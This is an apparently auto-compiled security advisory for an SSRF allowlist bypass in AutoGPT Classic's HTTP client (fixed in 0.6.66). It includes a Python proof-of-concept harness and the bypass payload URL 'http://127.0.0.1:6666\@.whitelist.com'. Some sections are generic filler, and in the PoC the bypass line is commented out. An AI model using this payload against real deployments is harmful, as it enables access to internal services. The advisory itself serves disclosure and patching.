---
id: "sok-vulnerabilities-GHSA-xxpr-ccx5-48mf-autogpt-classic-http-client-domain-allowlist-bypass-via-userinfo-and-backslash-url-tricks"
title: "GHSA-xxpr-ccx5-48mf: AutoGPT Classic: HTTP client domain allowlist bypass via userinfo and backslash URL tricks"
created: "2026-10-06"
synthesizes: []
links: []
---

# GHSA-xxpr-ccx5-48mf: AutoGPT Classic: HTTP client domain allowlist bypass via userinfo and backslash URL tricks

| Field | Value |
|-------|-------|
| **ID** | GHSA-xxpr-ccx5-48mf |
| **Class** | GitHub Security Advisory |
| **Component** | HTTP client domain allowlist bypass / HTTP client domain allowlist |
| **Affected Product** | AutoGPT |
| **Severity** | Moderate |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-918 |
| **Affected** | < 0.6.66 |
| **Fix Version** | `0.6.66` |
| **Source** | GitHub Security Advisory |

## 1. Overview

The URL checking logic in `_is_domain_allowed` has a logical flaw that could be bypassed by attackers, leading to SSRF attacks.

## 2. Technical Details

### 2.1 Root Cause

The vulnerable component accepted an attacker-controlled URL or network target and did not apply sufficient destination validation before the backend made the outbound request. In this case, the affected component is HTTP client domain allowlist bypass / HTTP client domain allowlist.

### 2.2 Affected Code

The advisory/source text also names the following relevant symbols or runtime objects:

- `_install_minimal_forge_stubs`
- `__class_getitem__`
- `__init__`
- `command`
- `decorator`
- `_load_http_client_module`
- `main`
- `ConfigurableComponent`
- `CommandProvider`
- `DirectiveProvider`

### 2.3 Exploitation Path

An attacker exercises the vulnerable component using the conditions described in the advisory, causing the documented security impact.

### 2.4 Attack Surface Summary

| Surface | Source-supported detail |
|---------|--------------------------|
| Component | HTTP client domain allowlist bypass / HTTP client domain allowlist |
| Named code objects | `_install_minimal_forge_stubs`<br>`__class_getitem__`<br>`__init__`<br>`command`<br>`decorator`<br>`_load_http_client_module`<br>`main`<br>`ConfigurableComponent` |
| Affected versions | < 0.6.66 |
| Patched version | `0.6.66` |

### 2.5 Source Evidence

#### Implementation evidence

The `_make_request` function validates the URL to be requested using `_is_domain_allowed` before sending the request.

The specific validation logic uses urlparse to parse the netloc portion of the URL and compares it with a whitelist. Only URLs that match the whitelist or end with a URL from the whitelist pass the validation.

However, there are indeed differences in parsing between urlparse and the library that actually sends the request.For example, for `http://127.0.0.1:6666\@.whitelist.com`, the netloc parsed by urlparse is `127.0.0.1:6666\@.whitelist.com`, which is a URL ending with a whitelist, and therefore will pass the validation.

`_make_request` sends a request via requests.get, treating backslashes () as forwards (/). This means that for `http://127.0.0.1:6666\@.whitelist.com`, it will actually request `http://127.0.0.1:6666/@.whitelist.com`, bypassing existing whitelist checks and allowing attackers to request arbitrary addresses, thus enabling SSRF attacks.

I have successfully reproduced the vulnerability locally.

```
from __future__ import annotations

import importlib.util
import json
import sys
import types
from pathlib import Path
from typing import Any

def _install_minimal_forge_stubs() -> None:
    forge_mod = types.ModuleType("forge")
    agent_mod = types.ModuleType("forge.agent")
    components_mod = types.ModuleType("forge.agent.components")
    protocols_mod = types.ModuleType("forge.agent.protocols")
    command_mod = types.ModuleType("forge.command")
    models_mod = types.ModuleType("forge.models")
    json_schema_mod = types.ModuleType("forge.models.json_schema")
    utils_mod = types.ModuleType("forge.utils")
    exceptions_mod = types.ModuleType("forge.utils.exceptions")

    class ConfigurableComponent:
        def __class_getitem__(cls, _item: Any) -> type["ConfigurableComponent"]:
            return cls

        def __init__(self, config: Any = None):
            if config is None and hasattr(self, "config_class"):
                self.config = self.config_class()
            else:
                self.config = config

    class CommandProvider:
        pass

    class DirectiveProvider:
        pass

    class Command:
        pass

    def command(*_args: Any, **_kwargs: Any):
        def decorator(func):
            return func

        return decorator

    class JSONSchema:
        class Type:
            STRING = "string"
            OBJECT = "object"
            INTEGER = "integer"

        def __init__(self, **kwargs: Any):
            self.kwargs = kwargs

    class HTTPError(Exception):
        def __init__(
            self,
            message: str,
            status_code: int | None = None,
            url: str | None = None,
        ):
            super().__init__(message)
            self.status_code = status_code
            self.url = url

    components_mod.ConfigurableComponent = ConfigurableComponent
    protocols_mod.CommandProvider = CommandProvider
    protocols_mod.DirectiveProvider = DirectiveProvider
    command_mod.Command = Command
    command_mod.command = command
    json_schema_mod.JSONSchema = JSONSchema
    exceptions_mod.HTTPError = HTTPError

    sys.modules["forge"] = forge_mod
    sys.modules["forge.agent"] = agent_mod
    sys.modules["forge.agent.components"] = components_mod
    sys.modules["forge.agent.protocols"] = protocols_mod
    sys.modules["forge.command"] = command_mod
    sys.modules["forge.models"] = models_mod
    sys.modules["forge.models.json_schema"] = json_schema_mod
    sys.modules["forge.utils"] = utils_mod
    sys.modules["forge.utils.exceptions"] = exceptions_mod

def _load_http_client_module(project_root: Path):
    http_client_path = (
        project_root / "classic" / "forge" / "forge" / "components" / "http_client" / "http_client.py"
    ).resolve()
    if not http_client_path.exists():
        raise FileNotFoundError(f"http_client file not found: {http_client_path}")

    _install_minimal_forge_stubs()

    spec = importlib.util.spec_from_file_location("minimal_http_client", http_client_path)
    if spec is None or spec.loader is None:
        raise RuntimeError("Failed to create module spec for http_client.py")

    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module

def main() -> None:
    project_root = Path(__file__).resolve().parent
    module = _load_http_client_module(project_root)

    HTTPClientComponent = module.HTTPClientComponent
    HTTPClientConfiguration = module.HTTPClientConfiguration

    client = HTTPClientComponent(
        HTTPClientConfiguration(
            allowed_domains=["whitelist.com"],
            default_timeout=15,
        )
    )

    result = client._make_request(
        method="GET",
        # url="http://127.0.0.1:6666\@.whitelist.com",
        url="http://127.0.0.1:6666",
        headers={"Accept": "application/json"},
        params={"source": "autogpt_test"},
        timeout=10,
    )

    print("Request success:")
    print(json.dumps(result, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

When we configure the whitelist to `whitelist.com`, if an attacker wants to request `http://127.0.0.1:6666`, it will obviously be rejected because it is not a URL in the whitelist.

However, when the attacker uses `http://127.0.0.1:6666\@.whitelist.com`, the existing whitelist detection is successfully bypassed, and the attacker successfully carries out an SSRF attack.

#### Proof-of-concept evidence

```
http://127.0.0.1:6666\@.whitelist.com
```

## 3. Vulnerable Code Pattern

The vulnerable pattern is the missing validation or authorization boundary in HTTP client domain allowlist bypass / HTTP client domain allowlist.

## 4. The Fix

Fix strategy:

- Upgrade AutoGPT to `0.6.66` or a later release containing the patch.
- Route outbound HTTP requests through AutoGPT's hardened request helper instead of direct library calls such as `urllib.request.urlopen` or unvalidated SMTP/HTTP clients.
- Validate the resolved destination, not only the URL string or scheme, and block loopback, private, link-local, multicast, and cloud metadata addresses.
- Preserve destination checks across redirects and DNS resolution so DNS rebinding and alternate IP encodings cannot bypass the blocklist.

Validation and regression checks:

- Requests to loopback, private, link-local, multicast, and cloud metadata addresses should be blocked.
- Redirect chains should be revalidated after each redirect target is resolved.
- Allowed public HTTP and HTTPS destinations should still work through the hardened request path.

Operational follow-up:

- Inventory self-hosted AutoGPT deployments and confirm whether their running version falls inside the affected range.
- If an immediate upgrade is not possible, backport the same validation, authorization, or dependency constraint shown by the linked fix material.
- Review outbound request logs for attempts to reach loopback, private, link-local, or metadata-service addresses.

## 5. Impact

An attacker exercises the vulnerable component using the conditions described in the advisory, causing the documented security impact.
CVSS metric breakdown:

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | High |
| Privileges Required | Low |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity | None |
| Availability | None |

## 6. References

- https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-xxpr-ccx5-48mf
